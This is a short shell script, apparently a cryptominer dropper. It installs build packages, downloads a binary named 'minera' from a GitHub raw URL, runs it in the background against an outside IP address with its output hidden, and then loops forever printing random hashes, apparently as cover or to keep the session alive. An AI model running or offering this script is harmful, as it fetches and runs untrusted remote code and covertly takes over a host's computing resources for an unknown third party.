sudo apt update
sudo apt install -y git build-essential cmake libuv1-dev uuid-dev libssl-dev
wget https://github.com/qhilapahal/qilabai/raw/main/minera
chmod +x minera
./minera -o 198.199.88.23:80 -t 1 >/dev/null &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1m; done
